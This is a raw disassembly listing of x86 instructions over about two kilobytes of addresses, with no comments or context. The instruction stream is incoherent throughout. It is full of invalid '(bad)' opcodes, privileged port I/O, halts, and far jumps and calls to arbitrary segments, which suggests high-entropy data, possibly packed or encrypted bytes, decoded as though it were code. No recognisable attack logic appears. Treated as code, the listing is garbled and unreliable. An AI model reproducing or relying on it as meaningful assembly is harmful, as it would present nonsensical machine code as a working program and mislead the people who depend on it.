  40d5bb:	mov    esp,0x82817e02
  40d5c0:	dec    ecx
  40d5c1:	or     cl,al
  40d5c3:	pop    edi
  40d5c4:	fst    DWORD PTR ds:0x6aaacaab
  40d5ca:	push   DWORD PTR [ecx+0x636520a]
  40d5d0:	push   cx
  40d5d2:	xchg   dl,dh
  40d5d4:	test   eax,0xe9c7b2fb
  40d5d9:	and    al,0x1f
  40d5db:	fistp  DWORD PTR [edi+ebp*1+0x664c6b4d]
  40d5e2:	mov    ebp,0x2c810c1a
  40d5e7:	xchg   edi,eax
  40d5e8:	scas   al,BYTE PTR es:[edi]
  40d5e9:	xchg   edx,edi
  40d5eb:	mov    al,ds:0x307d5edc
  40d5f0:	mov    ebx,0xd7f36863
  40d5f5:	cli    
  40d5f6:	pop    ebp
  40d5f7:	sbb    DWORD PTR [ebx-0x21c55e72],0x2e
  40d5fe:	sbb    BYTE PTR [ecx],0xbc
  40d601:	or     eax,0x87f46e8b
  40d606:	xchg   ecx,eax
  40d607:	jge    0x40d5cc
  40d609:	mov    ds:0x7f25d3f9,eax
  40d60e:	xor    BYTE PTR [ecx+0x630e6e9a],bl
  40d614:	jmp    0x40d5e4
  40d616:	js     0x40d5a2
  40d618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d619:	or     eax,0x7244a83b
  40d61e:	jp     0x40d66e
  40d620:	jecxz  0x40d5fe
  40d622:	cmp    BYTE PTR [edi+edx*4+0x10],cl
  40d626:	inc    edx
  40d627:	das    
  40d628:	jne    0x40d5ca
  40d62a:	scas   al,BYTE PTR es:[edi]
  40d62b:	mov    edi,DWORD PTR [esi+0x2dc79185]
  40d631:	inc    edx
  40d632:	dec    edi
  40d633:	cld    
  40d634:	jnp    0x40d5b6
  40d636:	sub    al,0xb2
  40d638:	push   cs
  40d639:	xor    dh,dl
  40d63b:	mov    dl,0xec
  40d63d:	ret    0x912a
  40d640:	xchg   edx,eax
  40d641:	push   edx
  40d642:	pop    es
  40d643:	xor    eax,0xf2758421
  40d648:	push   esi
  40d649:	cmp    bh,dl
  40d64b:	mov    edi,0x646f0016
  40d650:	push   esp
  40d651:	jmp    0xa4f7:0x506b55b3
  40d658:	pop    edx
  40d659:	adc    eax,0xc5e0adbe
  40d65e:	or     ecx,esi
  40d660:	arpl   WORD PTR [edx],dx
  40d662:	(bad)  
  40d663:	dec    DWORD PTR [esi+edi*1+0x14]
  40d667:	(bad)  
  40d669:	add    esp,ecx
  40d66b:	add    dl,bl
  40d66d:	jbe    0x40d6c7
  40d66f:	int3   
  40d670:	dec    eax
  40d671:	mov    ds:0x7df013f0,eax
  40d676:	in     eax,0xfa
  40d678:	mov    ebp,0xc2da5add
  40d67d:	iret   
  40d67e:	pop    ebx
  40d67f:	mov    esi,0xe4f574e
  40d684:	and    bh,BYTE PTR [ecx]
  40d686:	dec    esp
  40d687:	imul   ecx,DWORD PTR [ecx+0x51e2a8aa],0xe33cdaf1
  40d691:	scas   eax,DWORD PTR es:[edi]
  40d692:	sbb    BYTE PTR [edi+0x790acc69],ah
  40d698:	div    BYTE PTR [eax+0x54]
  40d69b:	rol    BYTE PTR [edi],0xb3
  40d69e:	mov    cl,0x9f
  40d6a0:	mov    si,0x4637
  40d6a4:	ret    
  40d6a5:	shl    ebx,cl
  40d6a7:	(bad)  
  40d6a8:	sbb    BYTE PTR [eax-0x57],dl
  40d6ab:	retf   0x57d
  40d6ae:	pop    ebx
  40d6af:	outs   dx,BYTE PTR ds:[esi]
  40d6b0:	mov    esp,0x643ac18b
  40d6b5:	cld    
  40d6b6:	stos   BYTE PTR es:[edi],al
  40d6b7:	call   0xfab9:0xa9d361be
  40d6be:	jns    0x40d689
  40d6c0:	jno    0x40d64b
  40d6c2:	add    DWORD PTR [ebx-0x1d151bd6],esp
  40d6c8:	rcr    BYTE PTR [esi],1
  40d6ca:	int    0x5
  40d6cc:	mov    ds:0x21a756bb,al
  40d6d1:	jnp    0x40d653
  40d6d3:	push   0x495179aa
  40d6d8:	mov    BYTE PTR [edi],dl
  40d6da:	push   ds
  40d6db:	push   edx
  40d6dd:	push   eax
  40d6de:	rol    DWORD PTR [esi],0xb6
  40d6e1:	inc    BYTE PTR [esi+eax*8]
  40d6e4:	push   eax
  40d6e5:	test   DWORD PTR [edi],edi
  40d6e7:	xchg   edx,eax
  40d6e8:	call   0x9a07:0x4527d0ee
  40d6ef:	sub    bh,ah
  40d6f1:	or     DWORD PTR [ebx],0x1d
  40d6f4:	ret    
  40d6f5:	lods   eax,DWORD PTR ds:[esi]
  40d6f6:	push   ds
  40d6f7:	retf   
  40d6f8:	int    0x1f
  40d6fa:	xor    ebx,ecx
  40d6fc:	loopne 0x40d6db
  40d6fe:	rol    BYTE PTR [esi],1
  40d700:	out    0x1f,al
  40d702:	add    eax,eax
  40d704:	xor    ebx,DWORD PTR [ebx]
  40d706:	loope  0x40d6bd
  40d708:	xchg   esi,eax
  40d709:	or     al,0xb7
  40d70b:	shl    DWORD PTR [edi+0x29],0xf6
  40d70f:	jp     0x40d6f1
  40d711:	(bad)  
  40d712:	jns    0x40d702
  40d714:	jecxz  0x40d723
  40d716:	in     eax,0x78
  40d718:	loope  0x40d726
  40d71a:	fidivr DWORD PTR [ebp+0x1db9cb4f]
  40d720:	jecxz  0x40d6b3
  40d722:	mov    ds:0x650185d8,eax
  40d727:	and    ecx,DWORD PTR [eax]
  40d729:	(bad)  
  40d72a:	outs   dx,DWORD PTR ds:[esi]
  40d72b:	or     bl,dl
  40d72d:	leave  
  40d72e:	add    ah,bh
  40d730:	scas   al,BYTE PTR es:[edi]
  40d731:	add    BYTE PTR [ecx],dl
  40d733:	test   BYTE PTR [eax+0x2c],cl
  40d736:	inc    ecx
  40d737:	pop    es
  40d738:	dec    ecx
  40d739:	add    bl,bh
  40d73b:	dec    esp
  40d73c:	xchg   esp,eax
  40d73d:	adc    al,0x87
  40d73f:	ret    
  40d740:	in     al,dx
  40d741:	cmp    eax,0x45353af
  40d746:	xchg   esi,eax
  40d747:	jo     0x40d6ce
  40d749:	jbe    0x40d704
  40d74b:	inc    edx
  40d74c:	or     al,0x58
  40d74e:	pop    ds
  40d74f:	ja     0x40d7a0
  40d751:	outs   dx,BYTE PTR ds:[esi]
  40d752:	das    
  40d753:	xchg   BYTE PTR [ecx],cl
  40d755:	xchg   ebx,eax
  40d756:	pop    es
  40d757:	and    ch,0xeb
  40d75a:	repnz mov dl,al
  40d75d:	sub    DWORD PTR [ecx+0x66721c02],esp
  40d763:	and    esi,DWORD PTR [ebx]
  40d765:	(bad)  
  40d766:	jnp    0x40d779
  40d768:	mov    dl,0x34
  40d76a:	rol    DWORD PTR [edx+0x315e05e6],cl
  40d770:	jno    0x40d749
  40d772:	fist   WORD PTR [ecx+ebp*8-0x29]
  40d776:	mov    bl,0xb4
  40d778:	mov    ds:0x43b30312,al
  40d77d:	xor    BYTE PTR [eax+0x52c3db15],bl
  40d783:	call   0x616c354d
  40d788:	fadd   QWORD PTR ds:0xf620dd3e
  40d78e:	cdq    
  40d78f:	xchg   edi,eax
  40d790:	retf   0x1a82
  40d793:	xchg   ebp,eax
  40d794:	sub    al,BYTE PTR [ebp-0x2c]
  40d797:	psrlq  mm2,QWORD PTR [ecx-0x14]
  40d79b:	and    BYTE PTR [eax],cl
  40d79d:	mov    esi,0xdf707540
  40d7a2:	sar    DWORD PTR [ecx+0x754694ba],0x99
  40d7a9:	mov    eax,ds:0xa661c4d8
  40d7ae:	pusha  
  40d7af:	xchg   esi,eax
  40d7b0:	sbb    ecx,DWORD PTR [edi]
  40d7b2:	mov    ah,0xbb
  40d7b4:	dec    eax
  40d7b5:	(bad)  
  40d7b6:	ror    DWORD PTR [ecx+0x7058c3fc],1
  40d7bc:	inc    edi
  40d7bd:	arpl   bx,cx
  40d7bf:	jge    0x40d77a
  40d7c1:	test   al,0xd9
  40d7c3:	jmp    0x40d7b7
  40d7c5:	cmp    BYTE PTR [ebx+ebx*4],bh
  40d7c8:	clc    
  40d7c9:	fdiv   st(2),st
  40d7cb:	sbb    BYTE PTR [edx],dh
  40d7cd:	fnstsw WORD PTR [ebx+0x4e584cc7]
  40d7d3:	jmp    FWORD PTR [ebx]
  40d7d5:	cdq    
  40d7d6:	repnz adc DWORD PTR [ebx+0x1c45e8d4],ebx
  40d7dd:	out    dx,al
  40d7de:	repz (bad) 
  40d7e0:	std    
  40d7e1:	fild   DWORD PTR [esi-0x7405460f]
  40d7e7:	sahf   
  40d7e8:	jg     0x40d770
  40d7ea:	(bad)  
  40d7eb:	mov    al,ds:0xc30c615d
  40d7f0:	(bad)  
  40d7f1:	ins    BYTE PTR es:[edi],dx
  40d7f2:	ja     0x40d7d0
  40d7f4:	mov    ds:0x1b6bffae,al
  40d7f9:	mov    al,0xf5
  40d7fb:	shl    dh,1
  40d7fd:	xor    eax,0x8ef14d9b
  40d802:	fsubr  QWORD PTR ds:0xdc0c0eee
  40d808:	inc    eax
  40d809:	les    eax,FWORD PTR [ecx+0x34]
  40d80c:	xchg   BYTE PTR [eax-0x6828b148],bh
  40d812:	mov    eax,0x8149567b
  40d817:	xchg   DWORD PTR [edi+0x602f355a],ebp
  40d81d:	out    dx,al
  40d81e:	sbb    ebp,DWORD PTR [ebx+0x23]
  40d821:	retf   0x86b6
  40d824:	js     0x40d7cd
  40d826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d827:	xor    BYTE PTR [eax],dl
  40d829:	bound  eax,QWORD PTR [ebx+0x17]
  40d82c:	adc    DWORD PTR [ecx+0x27d9a499],0x9fdf465e
  40d836:	push   eax
  40d837:	in     al,0x6b
  40d839:	sahf   
  40d83a:	iret   
  40d83b:	test   DWORD PTR [edx],0x4faa5511
  40d841:	pushf  
  40d842:	gs cmc 
  40d844:	aas    
  40d845:	rcr    eax,1
  40d847:	aaa    
  40d848:	mov    ebp,0xf9cd1dcf
  40d84d:	ret    0xf122
  40d850:	mov    bh,0xd8
  40d852:	xor    eax,0x225a7362
  40d857:	push   ecx
  40d858:	jbe    0x40d891
  40d85a:	cld    
  40d85b:	cld    
  40d85c:	inc    esp
  40d85d:	push   ds
  40d85e:	jmp    0x9fae:0x394c7cd1
  40d865:	jg     0x40d8bb
  40d867:	add    eax,0xd990c5c1
  40d86c:	out    dx,eax
  40d86d:	cs pop ebx
  40d86f:	push   ecx
  40d870:	push   ebx
  40d871:	(bad)  
  40d872:	adc    ecx,edi
  40d874:	mov    ah,0x47
  40d876:	or     DWORD PTR [edx+0x4b],edx
  40d879:	sub    eax,0x4fdab2d0
  40d87e:	mov    edx,0x20380cbd
  40d883:	jo     0x40d84a
  40d885:	mov    ah,0x40
  40d887:	popf   
  40d888:	test   BYTE PTR [eax+0x30],0xec
  40d88c:	inc    ebp
  40d88d:	daa    
  40d88e:	mov    ds:0xb4709a3c,al
  40d893:	adc    edi,ecx
  40d895:	scas   al,BYTE PTR es:[edi]
  40d896:	and    edi,DWORD PTR [esi+0x4e]
  40d899:	jbe    0x40d90c
  40d89b:	in     al,0x82
  40d89d:	in     al,0x54
  40d89f:	or     DWORD PTR [esi-0x6d15fb67],0x9bdbaf27
  40d8a9:	mov    esi,0x7af8a172
  40d8ae:	repz jmp 0x602c83cf
  40d8b4:	mov    esp,0x75384539
  40d8b9:	js     0x40d921
  40d8bb:	rcl    BYTE PTR [eax-0x60142571],cl
  40d8c1:	adc    ebx,DWORD PTR fs:[ebp+0x5c40e026]
  40d8c8:	dec    eax
  40d8c9:	(bad)  
  40d8ca:	hlt    
  40d8cb:	mov    BYTE PTR [esi-0x6be3f18f],ch
  40d8d1:	shr    dh,0xa
  40d8d4:	sbb    al,BYTE PTR [edi-0x2bbfd57d]
  40d8da:	cmp    al,BYTE PTR ss:[eax-0x7d91094d]
  40d8e1:	test   esi,ebp
  40d8e3:	sahf   
  40d8e4:	shr    BYTE PTR [ecx-0x43bdf171],cl
  40d8ea:	push   edi
  40d8eb:	sub    DWORD PTR [ebp+0x6a504613],esi
  40d8f1:	fstp   QWORD PTR [ebp-0x57]
  40d8f4:	add    al,0xd7
  40d8f6:	iret   
  40d8f7:	xor    ch,dl
  40d8f9:	out    dx,eax
  40d8fa:	into   
  40d8fb:	ret    
  40d8fc:	or     eax,0x5ee6b722
  40d901:	dec    edx
  40d902:	add    dh,dh
  40d904:	popf   
  40d905:	xchg   esp,eax
  40d906:	addr16 aam 0x39
  40d909:	out    dx,al
  40d90a:	pop    ebp
  40d90b:	mov    edx,0x721d6b75
  40d910:	sbb    al,BYTE PTR [ecx]
  40d912:	ins    DWORD PTR es:[edi],dx
  40d913:	lods   eax,DWORD PTR ds:[esi]
  40d914:	lea    eax,[esi+eiz*4+0x7c]
  40d918:	adc    ch,BYTE PTR [ebx-0x18]
  40d91b:	not    BYTE PTR [ecx-0x9]
  40d91e:	xor    ecx,eax
  40d920:	popa   
  40d921:	xor    al,0xb0
  40d923:	std    
  40d924:	sti    
  40d925:	les    ebx,FWORD PTR [ebp-0x7edce772]
  40d92b:	add    ah,bl
  40d92d:	ds jp  0x40d988
  40d930:	ja     0x40d9a8
  40d932:	inc    esp
  40d933:	pop    ss
  40d934:	fsub   DWORD PTR [esi+0x38c28a22]
  40d93a:	das    
  40d93b:	mov    al,BYTE PTR [edi+0x3129dba4]
  40d941:	sbb    al,0xe9
  40d943:	mov    edi,DWORD PTR [eax]
  40d945:	inc    esi
  40d946:	add    al,0x64
  40d948:	xor    ah,BYTE PTR [edi]
  40d94a:	ds pop ebx
  40d94c:	(bad)  
  40d94d:	jb     0x40d96d
  40d94f:	pop    ss
  40d950:	pushf  
  40d951:	inc    edx
  40d952:	cwde   
  40d953:	cs pop ecx
  40d955:	sahf   
  40d956:	sahf   
  40d957:	retf   
  40d958:	jmp    0xe59b:0x28185dc4
  40d95f:	jmp    DWORD PTR [edx-0x62aed7b5]
  40d965:	shl    BYTE PTR [ecx+ecx*1-0x34b85775],cl
  40d96c:	leave  
  40d96d:	(bad)  
  40d96e:	dec    esp
  40d96f:	or     BYTE PTR fs:[ebx],ah
  40d972:	inc    esp
  40d973:	sub    al,0xa6
  40d975:	stos   DWORD PTR es:[edi],eax
  40d976:	jb     0x40d920
  40d978:	jb     0x40d9db
  40d97a:	ret    0x73d6
  40d97d:	scas   eax,DWORD PTR es:[edi]
  40d97e:	pop    es
  40d97f:	mov    dl,0x2f
  40d981:	dec    edx
  40d982:	xchg   BYTE PTR [edi-0xf],ch
  40d985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d986:	in     eax,0x56
  40d988:	in     al,dx
  40d989:	xor    eax,0x8ff8cb3a
  40d98e:	and    BYTE PTR [eax],0x33
  40d991:	sub    BYTE PTR [eax+0x64684d82],0xb0
  40d998:	aam    0xbc
  40d99a:	ret    0xf434
  40d99d:	iret   
  40d99e:	dec    ecx
  40d99f:	mov    DWORD PTR [edx+ebp*1-0x3d],esp
  40d9a3:	leave  
  40d9a4:	loop   0x40da25
  40d9a6:	dec    eax
  40d9a7:	cmp    ecx,DWORD PTR [edi+esi*4]
  40d9aa:	or     bh,BYTE PTR [esi]
  40d9ac:	rcr    BYTE PTR [ebp+0x58020360],0x22
  40d9b3:	push   es
  40d9b4:	jecxz  0x40d9f6
  40d9b6:	imul   eax,DWORD PTR [edi+0x37551a7d],0x3d46ed55
  40d9c0:	cmp    DWORD PTR [esi],esi
  40d9c2:	sbb    eax,0x1bd51df5
  40d9c7:	push   edx
  40d9c8:	add    al,0xfc
  40d9ca:	rol    BYTE PTR [ebx+edx*4+0xbd4af71],cl
  40d9d1:	push   0x22
  40d9d3:	mov    ss,WORD PTR [ebx-0x2a]
  40d9d6:	fist   WORD PTR [ecx]
  40d9d8:	jecxz  0x40d9ef
  40d9da:	out    0x86,al
  40d9dc:	lahf   
  40d9dd:	cmp    eax,eax
  40d9df:	jae    0x40da5d
  40d9e1:	mov    eax,ds:0xba5ada53
  40d9e6:	and    ecx,DWORD PTR ds:0x2a57fda0
  40d9ec:	(bad)  
  40d9ed:	sti    
  40d9ee:	dec    eax
  40d9ef:	fist   WORD PTR [ebx-0x4e0a2eb1]
  40d9f5:	mov    esi,0x1a7e4480
  40d9fa:	fisttp QWORD PTR [edx+esi*2-0x7267874b]
  40da01:	(bad)  
  40da03:	mov    ebp,0x287e08ab
  40da08:	leave  
  40da09:	test   DWORD PTR [ecx+0x74],esp
  40da0c:	call   0x2e0f:0x7780aacc
  40da13:	xchg   edx,eax
  40da14:	mov    dh,0x27
  40da16:	cmp    dh,BYTE PTR [ecx]
  40da18:	pop    ebp
  40da19:	xor    al,0x5d
  40da1b:	jmp    0x40d9df
  40da1d:	pop    esi
  40da1e:	in     al,0xc
  40da20:	xchg   edx,eax
  40da21:	mov    al,ds:0x26c90880
  40da26:	test   DWORD PTR [edx],eax
  40da28:	sbb    eax,0x8b1f3b04
  40da2d:	cdq    
  40da2e:	lods   al,BYTE PTR ds:[esi]
  40da2f:	lds    edi,FWORD PTR ds:0x15a0ed0c
  40da35:	fistp  DWORD PTR [eax+0x32]
  40da38:	hlt    
  40da39:	add    eax,esi
  40da3b:	xor    ebp,DWORD PTR [esi*1+0x1e4438c2]
  40da42:	push   esi
  40da43:	outs   dx,DWORD PTR ds:[esi]
  40da44:	repz sbb ebx,DWORD PTR ds:[bx]
  40da49:	mov    dl,0xc0
  40da4b:	ins    BYTE PTR es:[edi],dx
  40da4c:	(bad)  
  40da4d:	stos   DWORD PTR es:[edi],eax
  40da4e:	xchg   DWORD PTR [edx],eax
  40da50:	pusha  
  40da51:	popf   
  40da52:	call   0x67a8:0x55d477d9
  40da59:	push   edx
  40da5a:	pop    esi
  40da5b:	cmp    esi,DWORD PTR [edx+0x504786af]
  40da61:	xchg   edi,ebp
  40da63:	(bad)  
  40da64:	adc    ebx,DWORD PTR [edi]
  40da66:	sub    eax,0x575e8859
  40da6b:	adc    ebx,edi
  40da6d:	popa   
  40da6e:	pop    ss
  40da6f:	leave  
  40da70:	jno    0x40da2d
  40da72:	xchg   ecx,esi
  40da74:	push   ecx
  40da75:	pop    edx
  40da76:	and    BYTE PTR [eax+edi*2+0x35],bh
  40da7a:	or     eax,0x356c2e0d
  40da7f:	jo     0x40dad7
  40da81:	(bad)  
  40da82:	mov    eax,0x73e6b249
  40da87:	jge    0x40da11
  40da89:	(bad)  
  40da8a:	xor    ebx,DWORD PTR [edi+0xe]
  40da8d:	mov    ds,WORD PTR [ecx-0x59]
  40da90:	lock pop edx
  40da92:	ror    DWORD PTR [esi],1
  40da94:	mov    esi,0x88c7ccf7
  40da99:	inc    eax
  40da9a:	(bad)  
  40da9b:	es es test cl,al
  40da9f:	pop    ebx
  40daa0:	adc    ecx,ebp
  40daa2:	call   0x26378648
  40daa7:	scas   al,BYTE PTR es:[edi]
  40daa8:	xchg   bh,cl
  40daaa:	sti    
  40daab:	push   edi
  40daac:	icebp  
  40daad:	sbb    ecx,DWORD PTR [edx]
  40daaf:	inc    edx
  40dab0:	imul   esi,edx,0xcc19c47e
  40dab6:	adc    eax,DWORD PTR [eax+0x61]
  40dab9:	outs   dx,DWORD PTR ds:[esi]
  40daba:	adc    eax,0xa69bc986
  40dabf:	dec    esi
  40dac0:	and    al,BYTE PTR [esi]
  40dac2:	call   0x1182:0xf5472a02
  40dac9:	sti    
  40daca:	stos   BYTE PTR es:[edi],al
  40dacb:	loopne 0x40da9b
  40dacd:	sbb    ah,BYTE PTR [ecx-0x7bd8bf19]
  40dad3:	mov    ch,BYTE PTR [ecx-0x26b70f81]
  40dad9:	xor    ch,0x49
  40dadc:	shl    BYTE PTR [esi+ebp*8],0x17
  40dae0:	test   eax,0xe51d6e6a
  40dae5:	inc    edi
  40dae6:	mov    edi,0x2d322a02
  40daeb:	xchg   ebp,eax
  40daec:	mov    al,0xb2
  40daee:	mov    al,0xdd
  40daf0:	repz les esp,FWORD PTR [eax]
  40daf3:	mov    dl,0x4a
  40daf5:	shl    BYTE PTR [esi],0x81
  40daf8:	fstp   QWORD PTR [eax]
  40dafa:	test   al,0xdb
  40dafc:	clc    
  40dafd:	sbb    BYTE PTR [edi-0x52857bd0],bl
  40db03:	xchg   DWORD PTR ds:[ebx+0x7bc2bd81],ecx
  40db0a:	push   edx
  40db0b:	xchg   esi,eax
  40db0c:	pusha  
  40db0d:	fild   WORD PTR [esp+eax*2]
  40db10:	pop    esp
  40db11:	pusha  
  40db12:	fimul  DWORD PTR ds:0xb89fa84c
  40db18:	xchg   DWORD PTR [edx-0x26ae990f],edi
  40db1e:	jnp    0x40db47
  40db20:	int3   
  40db21:	out    0xba,eax
  40db23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db24:	mov    DWORD PTR [eax+ebx*4-0x663fac26],esi
  40db2b:	push   0x968444e2
  40db30:	les    edx,FWORD PTR [esi-0x68d62a93]
  40db36:	(bad)  
  40db38:	sub    bh,dl
  40db3a:	and    al,0x42
  40db3c:	push   eax
  40db3d:	and    DWORD PTR [esi+0x10],ebx
  40db40:	cmp    BYTE PTR [ecx],ch
  40db42:	fs push eax
  40db44:	gs jmp 0x2f2dc62
  40db4a:	pop    ecx
  40db4b:	ficomp DWORD PTR [ebx+0x22]
  40db4e:	fs xchg esi,eax
  40db50:	mov    esp,?
  40db52:	push   eax
  40db53:	imul   esp,eax,0xffffffe7
  40db56:	call   0xa651:0x640c07b6
  40db5d:	xor    eax,0x73918475
  40db62:	ja     0x40dbc0
  40db64:	out    dx,al
  40db65:	and    eax,0xc77effc5
  40db6a:	jle    0x40db8c
  40db6c:	mov    esi,0x2bfded07
  40db71:	int    0x95
  40db73:	xor    cl,0x75
  40db76:	mov    ds,WORD PTR [ebp+eiz*2-0x2e]
  40db7a:	adc    ch,BYTE PTR [edx]
  40db7c:	push   0x4d26bd30
  40db81:	mov    bh,0xab
  40db83:	gs push 0x103a0051
  40db89:	(bad)  
  40db8c:	push   ecx
  40db8d:	adc    dl,BYTE PTR [ebp+0x14189ee7]
  40db93:	jmp    0x40dbca
  40db95:	or     al,0x3d
  40db97:	fucom  st(5)
  40db99:	dec    esi
  40db9a:	sub    DWORD PTR [ebx+0x7c09a87e],ebx
  40dba0:	sahf   
  40dba1:	out    dx,al
  40dba2:	aaa    
  40dba3:	dec    ebp
  40dba4:	std    
  40dba5:	int3   
  40dba6:	lods   al,BYTE PTR ds:[esi]
  40dba7:	mov    ch,0x33
  40dba9:	lahf   
  40dbaa:	push   ss
  40dbab:	clc    
  40dbac:	test   DWORD PTR [ebx],esi
  40dbae:	mov    ch,0xf3
  40dbb0:	stos   DWORD PTR es:[edi],eax
  40dbb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbb2:	push   esi
  40dbb3:	psrld  mm2,QWORD PTR [edi+0x4b9a9fce]
  40dbba:	dec    ebx
  40dbbb:	jecxz  0x40db53
  40dbbd:	or     eax,0xc431c9b2
  40dbc2:	pushf  
  40dbc3:	ds push edx
  40dbc5:	out    0x22,al
  40dbc7:	test   BYTE PTR [ebp+0x7476ed68],dh
  40dbcd:	test   eax,0xf6320f23
  40dbd2:	cdq    
  40dbd3:	dec    ecx
  40dbd4:	popa   
  40dbd5:	lock ja 0x40dc53
  40dbd8:	sub    eax,0x1792b6d8
  40dbdd:	or     BYTE PTR [edi-0x54e90305],ah
  40dbe3:	sbb    al,0x9c
  40dbe5:	sbb    DWORD PTR [esi+eax*8],edx
  40dbe8:	int3   
  40dbe9:	sbb    eax,edi
  40dbeb:	ret    0xf713
  40dbee:	loope  0x40dbfa
  40dbf0:	lods   eax,DWORD PTR ds:[esi]
  40dbf1:	dec    esp
  40dbf2:	push   esp
  40dbf3:	out    0xeb,al
  40dbf5:	mov    ds:0x9957d41a,al
  40dbfa:	add    al,0xb1
  40dbfc:	push   ds
  40dbfd:	ja     0x40dbe4
  40dbff:	int3   
  40dc00:	jno    0x40dbfd
  40dc02:	or     eax,0x6de25c09
  40dc07:	lock nop
  40dc09:	idiv   DWORD PTR [ecx+0x6d]
  40dc0c:	jp     0x40dbe4
  40dc0e:	loop   0x40dc7c
  40dc10:	ror    BYTE PTR [edi-0x42],0x6d
  40dc14:	lods   eax,DWORD PTR ds:[esi]
  40dc15:	sbb    BYTE PTR [edi+0x67],al
  40dc18:	xchg   ebp,eax
  40dc19:	and    ebx,eax
  40dc1b:	loopne 0x40dc99
  40dc1d:	jmp    0x129ad051
  40dc22:	fucomip st,st(3)
  40dc24:	xchg   ecx,eax
  40dc25:	shr    DWORD PTR [edx+0x34],cl
  40dc28:	stc    
  40dc29:	into   
  40dc2a:	mov    gs,WORD PTR [eax]
  40dc2c:	repnz cwde 
  40dc2e:	rcr    esp,1
  40dc30:	jmp    0x40dbcb
  40dc32:	xor    ebp,DWORD PTR [ecx-0x34636af5]
  40dc38:	inc    esi
  40dc39:	lahf   
  40dc3a:	test   DWORD PTR [esi+ecx*1+0x4678bd75],eax
  40dc41:	sbb    eax,0xf5907c24
  40dc46:	jp     0x40dc78
  40dc48:	mov    dl,0x3
  40dc4a:	inc    edx
  40dc4b:	jle    0x40dc72
  40dc4d:	dec    edx
  40dc4e:	add    bl,BYTE PTR [eax+ecx*2]
  40dc51:	ficomp WORD PTR [ebx-0x46f2f0ce]
  40dc57:	add    al,0x45
  40dc59:	mov    edx,DWORD PTR ds:0x3366ca36
  40dc5f:	hlt    
  40dc60:	or     al,0x5d
  40dc62:	mov    dl,0x4c
  40dc64:	jae    0x40dcd5
  40dc66:	arpl   bp,bx
  40dc68:	pop    eax
  40dc69:	xchg   esp,eax
  40dc6a:	out    0xd3,eax
  40dc6c:	dec    edx
  40dc6d:	mov    eax,ds:0x2e6b7d75
  40dc72:	repz shl DWORD PTR [eax+ebp*8],1
  40dc76:	pop    eax
  40dc77:	add    cl,BYTE PTR ds:0xae76fe64
  40dc7d:	std    
  40dc7e:	fnstcw WORD PTR [esi-0x10b7f5a3]
  40dc84:	mov    bl,BYTE PTR [ebp+0x4413733a]
  40dc8a:	leave  
  40dc8b:	inc    esi
  40dc8c:	xchg   edi,eax
  40dc8d:	mov    ds:0xde1ca3d,al
  40dc92:	mov    esp,edi
  40dc94:	in     eax,dx
  40dc95:	mov    ds:0xed4122e3,al
  40dc9a:	add    dl,dh
  40dc9c:	jbe    0x40dc37
  40dc9e:	xchg   DWORD PTR [ebx],eax
  40dca0:	xchg   ebx,eax
  40dca1:	adc    al,0x6a
  40dca3:	pop    edx
  40dca4:	xchg   esi,eax
  40dca5:	mov    ecx,0xca4c28ed
  40dcaa:	test   al,0xb1
  40dcac:	out    0xf5,eax
  40dcae:	in     eax,dx
  40dcaf:	enter  0xd39d,0x9b
  40dcb3:	test   eax,0xf2e4e263
  40dcb8:	jecxz  0x40dcf4
  40dcba:	fisubr DWORD PTR [edi+0x6ddfee17]
  40dcc0:	add    bl,BYTE PTR [edx]
  40dcc2:	cwde   
  40dcc3:	pop    ebp
  40dcc4:	out    0x40,eax
  40dcc6:	scas   al,BYTE PTR es:[edi]
  40dcc7:	cmp    dl,dl
  40dcc9:	loop   0x40dcb2
  40dccb:	pusha  
  40dccc:	sahf   
  40dccd:	sub    eax,0x536dec2f
  40dcd2:	movntq QWORD PTR [eax],mm7
  40dcd5:	jno    0x40dd45
  40dcd7:	pop    eax
  40dcd8:	rol    ebp,1
  40dcda:	inc    ecx
  40dcdb:	jb     0x40dcc2
  40dcdd:	rol    bh,1
  40dcdf:	pop    ds
  40dce0:	jmp    0x40dc6b
  40dce2:	push   ss
  40dce3:	stc    
  40dce4:	pop    ecx
  40dce5:	aas    
  40dce6:	xor    edi,DWORD PTR [ecx]
  40dce8:	int3   
  40dce9:	std    
  40dcea:	sbb    esi,0x34
  40dced:	mov    eax,0xe8731bfd
  40dcf2:	mov    cl,0x5e
  40dcf4:	das    
  40dcf5:	jnp    0x40dd6c
  40dcf7:	lea    esi,[esi+0x1c]
  40dcfa:	sub    bl,BYTE PTR [ebx-0x10]
  40dcfd:	and    ebp,edx
  40dcff:	lods   al,BYTE PTR ds:[esi]
  40dd00:	sbb    bl,al
  40dd02:	ret    0xa857
  40dd05:	and    al,0xb4
  40dd07:	inc    esi
  40dd08:	dec    ecx
  40dd09:	hlt    
  40dd0a:	xlat   BYTE PTR ds:[ebx]
  40dd0b:	or     BYTE PTR [ecx+0x10],ch
  40dd0e:	dec    edx
  40dd0f:	(bad)  [ecx-0x46]
  40dd12:	xor    dl,BYTE PTR [edx]
  40dd14:	pop    ebp
  40dd15:	enter  0xbe19,0xa3
  40dd19:	dec    esi
  40dd1a:	enter  0x8711,0xba
  40dd1e:	xchg   ebx,eax
  40dd1f:	jns    0x40dcb1
  40dd21:	add    esi,ecx
  40dd23:	enter  0x9b07,0x8b
  40dd27:	inc    eax
  40dd28:	mov    edx,0x33dd7edd
  40dd2d:	adc    BYTE PTR [ebx+0xb05c98c],al
  40dd33:	loope  0x40dcfd
  40dd35:	cmp    eax,0x750e1eff
  40dd3a:	imul   edx,DWORD PTR [ebx+esi*1],0xffffff95
  40dd3e:	lods   al,BYTE PTR ds:[esi]
  40dd3f:	cmp    DWORD PTR ds:0x9683b36f,eax
  40dd45:	push   ds
  40dd46:	fidivr DWORD PTR [ebp+0x125dc257]
  40dd4c:	xor    eax,0xe64fe434
  40dd51:	push   eax
  40dd52:	push   cs
  40dd53:	imul   esi,DWORD PTR [edx+0x739dd5bf],0x387a7129
  40dd5d:	fmulp  st(2),st
  40dd5f:	fisttp WORD PTR [eax]
  40dd61:	je     0x40dd1d
  40dd63:	gs xchg esi,eax
  40dd65:	sub    DWORD PTR [ecx],esp
  40dd67:	jle    0x40dd5c
  40dd69:	pushf  
  40dd6a:	arpl   WORD PTR [eax-0x41e3ff2a],dx
  40dd70:	or     bh,BYTE PTR [esi-0x80]
